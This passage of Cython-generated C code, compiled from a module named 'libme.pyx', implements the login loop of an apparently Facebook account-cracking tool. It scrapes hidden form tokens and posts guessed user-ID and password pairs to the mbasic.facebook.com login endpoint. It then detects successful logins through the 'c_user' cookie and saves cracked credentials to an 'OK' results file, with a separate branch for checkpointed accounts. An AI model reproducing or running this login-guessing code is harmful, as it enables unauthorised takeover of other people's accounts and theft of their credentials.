        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_XGIVEREF(__pyx_t_16);
        __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);
        goto __pyx_L5_continue;
        __pyx_L8_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_14);
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_XGIVEREF(__pyx_t_16);
        __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);
        __pyx_L14_try_end:;
      }

      /* "libme.pyx":824
 * 			b = parser(p,"html.parser")
 * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 * 			for i in b("input"):             # <<<<<<<<<<<<<<
 * 				try:
 * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
 */
      __pyx_L5_continue:;
    }
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "libme.pyx":829
 * 					else:continue
 * 				except:pass
 * 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})             # <<<<<<<<<<<<<<
 * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 * 			if "c_user" in ses.cookies.get_dict().keys():
 */
    __pyx_t_3 = __Pyx_PyDict_NewPresized(11); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 829, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_email, __pyx_v_uid) < 0) __PYX_ERR(0, 829, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_pass, __pyx_v_pw) < 0) __PYX_ERR(0, 829, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_prefill_contact_point, __pyx_kp_s_) < 0) __PYX_ERR(0, 829, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_prefill_source, __pyx_kp_s_) < 0) __PYX_ERR(0, 829, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_prefill_type, __pyx_kp_s_) < 0) __PYX_ERR(0, 829, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_first_prefill_source, __pyx_kp_s_) < 0) __PYX_ERR(0, 829, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_first_prefill_type, __pyx_kp_s_) < 0) __PYX_ERR(0, 829, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_had_cp_prefilled, __pyx_n_s_false) < 0) __PYX_ERR(0, 829, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_had_password_prefilled, __pyx_n_s_false) < 0) __PYX_ERR(0, 829, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_is_smart_lock, __pyx_n_s_false) < 0) __PYX_ERR(0, 829, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_fb_noscript, __pyx_n_s_true) < 0) __PYX_ERR(0, 829, __pyx_L1_error)
    __pyx_t_8 = __Pyx_CallUnboundCMethod1(&__pyx_umethod_PyDict_Type_update, __pyx_v_kwargs, __pyx_t_3); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 829, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

    /* "libme.pyx":830
 * 				except:pass
 * 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)             # <<<<<<<<<<<<<<
 * 			if "c_user" in ses.cookies.get_dict().keys():
 * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
 */
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_post); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 830, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_3 = PyNumber_Add(__pyx_v_host, __pyx_kp_s_login_device_based_regular_logi); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 830, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_7 = PyTuple_New(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 830, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_t_3);
    __pyx_t_3 = 0;
    __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 830, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_data, __pyx_v_kwargs) < 0) __PYX_ERR(0, 830, __pyx_L1_error)
    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_t_7, __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 830, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF_SET(__pyx_v_gaaa, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":831
 * 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 * 			if "c_user" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
 * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
 * 				print("\r  \033[1;92m ~> %s|%s\033[0;97m"%(uid, pw))
 */
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 831, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 831, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_8);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_8, function);
      }
    }
    __pyx_t_3 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 831, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_keys); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 831, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_8);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_8, function);
      }
    }
    __pyx_t_4 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 831, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_18 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_c_user, __pyx_t_4, Py_EQ)); if (unlikely(__pyx_t_18 < 0)) __PYX_ERR(0, 831, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_17 = (__pyx_t_18 != 0);
    if (__pyx_t_17) {

      /* "libme.pyx":832
 * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 * 			if "c_user" in ses.cookies.get_dict().keys():
 * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")             # <<<<<<<<<<<<<<
 * 				print("\r  \033[1;92m ~> %s|%s\033[0;97m"%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))
 */
      __pyx_t_4 = PyList_New(0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 832, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 832, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 832, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_3 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 832, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_items); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 832, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_3)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_3);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_8 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 832, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (likely(PyList_CheckExact(__pyx_t_8)) || PyTuple_CheckExact(__pyx_t_8)) {
        __pyx_t_6 = __pyx_t_8; __Pyx_INCREF(__pyx_t_6); __pyx_t_12 = 0;
        __pyx_t_13 = NULL;
      } else {
        __pyx_t_12 = -1; __pyx_t_6 = PyObject_GetIter(__pyx_t_8); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 832, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_13 = Py_TYPE(__pyx_t_6)->tp_iternext; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 832, __pyx_L1_error)
      }
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      for (;;) {
        if (likely(!__pyx_t_13)) {
          if (likely(PyList_CheckExact(__pyx_t_6))) {
            if (__pyx_t_12 >= PyList_GET_SIZE(__pyx_t_6)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_8 = PyList_GET_ITEM(__pyx_t_6, __pyx_t_12); __Pyx_INCREF(__pyx_t_8); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 832, __pyx_L1_error)
            #else
            __pyx_t_8 = PySequence_ITEM(__pyx_t_6, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 832, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_8);
            #endif
          } else {
            if (__pyx_t_12 >= PyTuple_GET_SIZE(__pyx_t_6)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_8 = PyTuple_GET_ITEM(__pyx_t_6, __pyx_t_12); __Pyx_INCREF(__pyx_t_8); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 832, __pyx_L1_error)
            #else
            __pyx_t_8 = PySequence_ITEM(__pyx_t_6, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 832, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_8);
            #endif
          }
        } else {
          __pyx_t_8 = __pyx_t_13(__pyx_t_6);
          if (unlikely(!__pyx_t_8)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 832, __pyx_L1_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_8);
        }
        if ((likely(PyTuple_CheckExact(__pyx_t_8))) || (PyList_CheckExact(__pyx_t_8))) {
          PyObject* sequence = __pyx_t_8;
          Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
          if (unlikely(size != 2)) {
            if (size > 2) __Pyx_RaiseTooManyValuesError(2);
            else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
            __PYX_ERR(0, 832, __pyx_L1_error)
          }
          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
          if (likely(PyTuple_CheckExact(sequence))) {
            __pyx_t_3 = PyTuple_GET_ITEM(sequence, 0); 
            __pyx_t_7 = PyTuple_GET_ITEM(sequence, 1); 
          } else {
            __pyx_t_3 = PyList_GET_ITEM(sequence, 0); 
            __pyx_t_7 = PyList_GET_ITEM(sequence, 1); 
          }
          __Pyx_INCREF(__pyx_t_3);
          __Pyx_INCREF(__pyx_t_7);
          #else
          __pyx_t_3 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 832, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_7 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 832, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_7);
          #endif
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        } else {
          Py_ssize_t index = -1;
          __pyx_t_11 = PyObject_GetIter(__pyx_t_8); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 832, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_19 = Py_TYPE(__pyx_t_11)->tp_iternext;
          index = 0; __pyx_t_3 = __pyx_t_19(__pyx_t_11); if (unlikely(!__pyx_t_3)) goto __pyx_L19_unpacking_failed;
          __Pyx_GOTREF(__pyx_t_3);
          index = 1; __pyx_t_7 = __pyx_t_19(__pyx_t_11); if (unlikely(!__pyx_t_7)) goto __pyx_L19_unpacking_failed;
          __Pyx_GOTREF(__pyx_t_7);
          if (__Pyx_IternextUnpackEndCheck(__pyx_t_19(__pyx_t_11), 2) < 0) __PYX_ERR(0, 832, __pyx_L1_error)
          __pyx_t_19 = NULL;
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          goto __pyx_L20_unpacking_done;
          __pyx_L19_unpacking_failed:;
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __pyx_t_19 = NULL;
          if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
          __PYX_ERR(0, 832, __pyx_L1_error)
          __pyx_L20_unpacking_done:;
        }
        __Pyx_XDECREF_SET(__pyx_v_key, __pyx_t_3);
        __pyx_t_3 = 0;
        __Pyx_XDECREF_SET(__pyx_v_value, __pyx_t_7);
        __pyx_t_7 = 0;
        __pyx_t_8 = PyTuple_New(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 832, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_INCREF(__pyx_v_key);
        __Pyx_GIVEREF(__pyx_v_key);
        PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_v_key);
        __Pyx_INCREF(__pyx_v_value);
        __Pyx_GIVEREF(__pyx_v_value);
        PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_v_value);
        __pyx_t_7 = __Pyx_PyString_Format(__pyx_kp_s_s_s_3, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 832, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(__Pyx_ListComp_Append(__pyx_t_4, (PyObject*)__pyx_t_7))) __PYX_ERR(0, 832, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      }
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyString_Join(__pyx_kp_s__56, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 832, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_replace); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 832, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__57, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 832, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_kuki = __pyx_t_6;
      __pyx_t_6 = 0;

      /* "libme.pyx":833
 * 			if "c_user" in ses.cookies.get_dict().keys():
 * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
 * 				print("\r  \033[1;92m ~> %s|%s\033[0;97m"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				self.ok.append("%s|%s"%(uid, pw))
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 */
      __pyx_t_6 = PyTuple_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 833, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_v_pw);
      __pyx_t_4 = __Pyx_PyString_Format(__pyx_kp_s_1_92m_s_s_0_97m, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 833, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 833, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      /* "libme.pyx":834
 * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
 * 				print("\r  \033[1;92m ~> %s|%s\033[0;97m"%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 */
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ok); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 834, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_6 = PyTuple_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 834, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_v_pw);
      __pyx_t_7 = __Pyx_PyString_Format(__pyx_kp_s_s_s, __pyx_t_6); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 834, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_20 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_t_7); if (unlikely(__pyx_t_20 == ((int)-1))) __PYX_ERR(0, 834, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      /* "libme.pyx":835
 * 				print("\r  \033[1;92m ~> %s|%s\033[0;97m"%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				break
 * 			elif "checkpoint" in ses.cookies.get_dict().keys():
 */
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_date); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 835, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_6 = __Pyx_PyString_FormatSafe(__pyx_kp_s_OK_s_txt, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 835, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = PyTuple_New(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 835, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_6);
      PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_6);
      __Pyx_INCREF(__pyx_n_s_a);
      __Pyx_GIVEREF(__pyx_n_s_a);
      PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_n_s_a);
      __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_4, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 835, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 835, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = PyTuple_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 835, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_v_pw);
      __pyx_t_8 = __Pyx_PyString_Format(__pyx_kp_s_s_s_2, __pyx_t_6); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 835, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_7 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_6, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_8);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 835, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      /* "libme.pyx":836
 * 				self.ok.append("%s|%s"%(uid, pw))
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break             # <<<<<<<<<<<<<<
 * 			elif "checkpoint" in ses.cookies.get_dict().keys():
 * 				print("\r  \033[1;91m ~> %s|%s\033[0;97m        "%(uid, pw))
 */
      goto __pyx_L4_break;

      /* "libme.pyx":831
 * 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 * 			if "c_user" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
 * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
 * 				print("\r  \033[1;92m ~> %s|%s\033[0;97m"%(uid, pw))
 */
    }

    /* "libme.pyx":837
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 * 			elif "checkpoint" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
 * 				print("\r  \033[1;91m ~> %s|%s\033[0;97m        "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))
 */
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 837, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 837, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = NULL;
